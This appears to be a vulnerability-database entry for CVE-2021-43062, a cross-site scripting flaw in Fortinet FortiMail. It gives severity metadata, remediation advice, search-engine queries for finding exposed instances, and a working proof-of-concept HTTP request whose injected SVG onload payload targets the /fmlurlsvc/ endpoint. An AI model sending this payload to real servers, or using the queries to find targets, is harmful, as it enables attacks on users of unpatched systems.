---
layout: post
cve_id: CVE-2021-43062
title: Fortinet FortiMail 7.0.1 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-43062.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-43062.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ajaysenr
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary script code in the context of the targeted user''s browser, potentially
  leading to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Apply the latest security patch or upgrade to a non-vulnerable version
  of Fortinet FortiMail.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-43062
- https://www.fortiguard.com/psirt/FG-IR-21-185
- https://www.exploit-db.com/exploits/50759
- https://fortiguard.com/advisory/FG-IR-21-185
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-43062
  cwe-id: CWE-79
  epss-score: 0.50211
  epss-percentile: 0.97731
  cpe: cpe:2.3:a:fortinet:fortimail:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: fortinet
  product: fortimail
  shodan-query: http.title:"fortimail"
  fofa-query:
  - title="fortimail"
  - fortimail && port=443
  google-query: intitle:"fortimail"
tags:
- cve
- cve2021
- fortimail
- xss
- fortinet
- edb
- vuln
---

## üîç Vulnerability Description
A cross-site scripting vulnerability in FortiMail may allow an unauthenticated attacker to perform an attack via specially crafted HTTP GET requests to the FortiGuard URI protection service.

## üåê HTTP Request
```nohighlight
GET /fmlurlsvc/?url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

